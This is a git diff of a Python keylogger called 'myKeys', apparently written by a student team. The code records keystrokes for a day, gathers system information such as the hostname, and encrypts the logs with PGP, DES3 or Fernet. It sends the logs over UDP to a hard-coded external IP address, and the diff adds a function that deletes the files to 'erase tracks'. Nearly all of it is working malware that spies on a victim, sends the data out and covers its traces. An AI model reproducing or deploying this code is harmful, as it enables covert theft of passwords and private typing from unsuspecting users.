@@ -1,6 +1,16 @@
+print("                  _  __")
+print("                 | |/ /")
+print("  _ __ ___  _   _| ' / ___ _   _ ___")
+print(" | '_ ` _ \| | | |  < / _ \ | | / __|")
+print(" | | | | | | |_| | . \  __/ |_| \__ \\")
+print(" |_| |_| |_|\__, |_|\_\___|\__, |___/")
+print("             __/ |          __/ |")
+print("            |___/          |___/")
+
+
 # Team myKeys
 # keylogger.py
-# Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins, !!add rest of your names here!!
+# Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins
 
 # Libraries Used
 import base64
@@ -22,20 +32,24 @@ from random import SystemRandom
 
 from cryptography.fernet import Fernet
 
+# naming files that will be generated
 loggedKeys = "loggedKeys.txt"
 systemInfo = "systemInfo.txt"
 
+# naming encrypted files that will be generated
 loggedKeysEncrypted = "loggedKeysEncrypted.txt"
 systemInfoEncrypted = "systemInfoEncrypted.txt"
 
 ## Networking Variables
 udpPort = 25005
 buffer_size = 1024
-server_ip = "35.231.244.179"  # static ip addr
+server_ip = "35.231.244.179"  # static ip address
+
 # path to the gnupg location
-Path_to_foldergpg = 'C:\\Users\\User\\Documents\\Winter2021\\cis350\\myKeys\\'
+Path_to_foldergpg = 'C:\\Users\\User\\Documents\\Winter2021\\cis350\\myKeys\\' # cutomize this field
+
 # payload destination variables
-path = "C:\Windows\Temp"
+path = "C:\Windows\Temp" #customize this field
 extend = "\\"
 extendedPath = path + extend
 
@@ -89,10 +103,10 @@ def sendFile(filename, isSysInfo):
 
 ### This creates a document that contains useful system information and specifications ###
 def getSystemInfo():
-    # needs error handling
+    
     with open(extendedPath + systemInfo, "a") as f:
-        hostname = socket.gethostname()
         # Writes hostname
+        hostname = socket.gethostname()
         try:
             f.write("Hostname: " + hostname + '\n')
 
@@ -155,14 +169,13 @@ logTime = 86400  # This should be 24 hours equivalent (I think)
 currentTime = time.time()
 endTime = currentTime + logTime  # Will result in 24 hours after currentTime
 
-### Establishes how long the program will record keys ###
-### All Key Recording Processes are below ###
+# Establishes how long the program will record keys 
+# All Key Recording Processes are below 
 while currentTime < endTime:
     count = 0
     keys = []
 
-
-    ### When a key is pressed ###
+# when a key is pressed
     def onPress(key):
         global keys
         global count
@@ -178,8 +191,7 @@ while currentTime < endTime:
             writeToFile(keys)
             keys = []
 
-
-    ### Writes keys to file ###
+# writes keys to file
     def writeToFile(keys):
         # needs error handling
         with open(extendedPath + loggedKeys, "a") as f:
@@ -193,7 +205,7 @@ while currentTime < endTime:
                     f.close()
 
 
-    ### When a key is released ###
+# on key release
     def onRelease(key):
         # This may not be needed
         if key == Key.esc:
@@ -219,9 +231,9 @@ while currentTime < endTime:
         encryptions(key, name, email, syslog, keylog)
 
 
-### ENCRYPT FILES HERE ###
-# PGP encryption
+# Files are encrypted below
 
+# PGP encryption
 # encrypt files
 def encryptions(key, name, email, system, keylogger):
     systemfiles_to_encrypt = [extendedPath + systemInfo]
@@ -253,12 +265,10 @@ def encryptions(key, name, email, system, keylogger):
             sendFile(keylogger_encrypt_filename[count], False)
         count += 1
     ### Deletes Files After they are Encrypted and Sent ###
-    deleteFiles = [systemInfo, loggedKeys]
-    for file in deleteFiles:
-        os.remove(extendedPath + file)
+    remove_files()
 
 
-### ENCRYPT FILES HERE ###
+
 # des3 encryption
 
 # encrypt files
@@ -302,26 +312,35 @@ def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
             output=encrypted_file + '.gpg')
     return encrypted_file
 
-# Fernet Encryption - May be implemented later
-# def fernetEncrypt():
-#     filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
-#     encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
 
-#     count = 0
+# Fernet encryption
+def fernet_encrypt():
+    files_to_encrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
+    encrypted_file_names = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
 
-#     for encryptingFile in filesToEncrypt:
+    count = 0
 
-#         with open(filesToEncrypt[count], 'rb') as f:
-#             data = f.read()
+    for encrypting_file in files_to_encrypt:
 
-#         fernet = Fernet(key)
-#         encrypted = fernet.encrypt(data)
+        with open(files_to_encrypt[count], 'rb') as f:
+            data = f.read()
 
-#         with open(encryptedFileNames[count], 'wb') as f:
-#             f.write(encrypted)
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(data)
 
-#         ### SEND ENCRYPTED FILES TO SERVER HERE ###
-#         #sendFile()
-#         count += 1
+        with open(encrypted_file_names[count], 'wb') as f:
+            f.write(encrypted)
 
-#     time.sleep(120)
+        count += 1
+    sendFile(extendedPath + extend + systemInfoEncrypted, True)
+    time.sleep(20)
+    sendFile(extendedPath + extend + loggedKeysEncrypted, False)
+    time.sleep(30)
+
+# erases tracks by removing files (files will not be sent to the recycle bin)
+def remove_files():
+    delete_files = [systemInfo, loggedKeys, systemInfoEncrypted, loggedKeysEncrypted]
+    for file in delete_files:
+        os.remove(extendedPath + file)
+
+
